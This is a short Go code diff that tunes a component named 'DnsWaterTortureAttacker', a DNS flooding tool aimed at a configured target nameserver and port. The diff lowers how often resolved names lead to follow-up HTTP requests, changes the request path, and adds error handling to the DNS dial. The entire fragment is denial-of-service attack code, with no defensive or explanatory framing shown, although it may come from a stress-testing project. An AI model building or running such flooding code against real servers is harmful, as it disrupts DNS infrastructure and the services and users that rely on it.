@@ -90,10 +90,10 @@ func (a *DnsWaterTortureAttacker) Attack(ctx context.Context, httpClient *http.C
 	b := buf.Bytes()
 	name := unsafe.String(&b[0], len(b))
 	ip := a.lookup(ctx, name)
-	if ip != nil && atomic.AddUint64(&a.resolvedRequests, 1)%2 == 0 {
+	if ip != nil && atomic.AddUint64(&a.resolvedRequests, 1)%5 == 0 {
 		// TODO target url
 		host := fmt.Sprintf("%s:%d", strings.TrimRight(name, "."), config.TargetPort)
-		url := fmt.Sprintf("%s://%s/api/tag",
+		url := fmt.Sprintf("%s://%s/",
 			config.HTTPScheme,
 			host,
 		)
@@ -129,7 +129,10 @@ var msgPool = sync.Pool{
 func (a *DnsWaterTortureAttacker) lookup(ctx context.Context, name string) net.IP {
 	if !a.connected {
 		nameserver := net.JoinHostPort(config.TargetNameserver, strconv.Itoa(config.DNSPort))
-		dnsConn, _ := a.dnsClient.Dial(nameserver)
+		dnsConn, err := a.dnsClient.Dial(nameserver)
+		if err != nil {
+			return nil
+		}
 		a.connected = true
 		a.dnsConn = dnsConn
 	}
